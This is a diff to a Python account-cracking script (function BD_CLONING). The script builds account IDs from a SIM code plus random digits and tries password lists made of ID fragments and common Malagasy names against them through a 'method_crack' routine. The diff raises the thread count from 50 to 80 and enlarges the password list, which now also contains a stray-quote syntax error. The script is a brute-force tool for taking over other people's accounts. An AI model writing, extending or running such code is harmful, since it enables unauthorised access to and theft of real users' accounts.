@@ -108,7 +108,7 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with tred(max_workers=50) as Dipto:
+    with tred(max_workers=80) as Dipto:
         tl=str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=[psx,code+psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','sedera','Sedera','hanitra','Hanitra','fitiavana','Fitiavana','sarindra','sarindra','fanomezantsoa','Fanomezantsoa','valisoa','Valisoa','sarobidy','Sarobidy','safidy','Safidy','nomena','Nomena','billie','Billie','ravaka','Ravaka','mendrika','Mendrika','mangazo','Mangazo','fifalina','Fifalina','fanantenana','Fannatenana','milely','Milely','mamisoa','Mamisoa','farakely','Farakely','liantsoa','Liantsoa','randria','Randria','andriam','Andriam','randriam','Randriam','akiziko','Akiziko','Narindra','narindra']
+            passlist=[psx,code+psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'fanantenana','Fanantenana','malala','Malala','mahery','Mahery','volana','Volana','volatina','Volatina','vololona','Vololona','mahaleo','Mahaleo','dadakely','Dadakely','mamasosiko','Mamasosiko','papasosiko','Papasosiko','mamisoa','Mamisoa','mampionona','Mampionona','mamasosy','Mamasosy','mamakely',''Mamakely','papasosy','Papasosy','milely','Milely','sedera','Sedera','hanitra','Hanitra','fitiavana','Fitiavana','sarindra','sarindra','fanomezantsoa','Fanomezantsoa','valisoa','Valisoa','sarobidy','Sarobidy','safidy','Safidy','nomena','Nomena','billie','Billie','ravaka','Ravaka','mendrika','Mendrika','mangazo','Mangazo','fifalina','Fifalina','fanantenana','Fannatenana','milely','Milely','mamisoa','Mamisoa','farakely','Farakely','liantsoa','Liantsoa','randria','Randria','andriam','Andriam','randriam','Randriam','akiziko','Akiziko','Narindra','narindra']
             Dipto.submit(method_crack,ids,passlist)
             
     linex()
